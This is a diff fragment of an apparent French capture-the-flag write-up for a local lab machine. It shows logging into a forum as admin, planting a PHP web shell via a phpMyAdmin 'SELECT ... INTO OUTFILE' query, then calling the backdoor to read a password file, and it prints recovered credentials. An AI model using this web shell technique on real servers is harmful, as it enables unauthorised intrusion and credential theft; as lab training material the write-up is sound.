@@ -44,3 +44,6 @@ On se log in avec admin et "!q\]Ej?*5K5cy*AJ" sur le forum et bingo on est conne
 Dans la console mysql de phpmyadmin on peut executer la commande SQL suivante: SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php";.
 
 10. Maintenant notre backdoor est accessible en allant sur /forum/templates_c/backdoor.php
+
+11.En allant sur 192.168.56.105/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/password on obtiens cette paire user mot de passe:
+lmezard:G!@M6f4Eatau{sF"
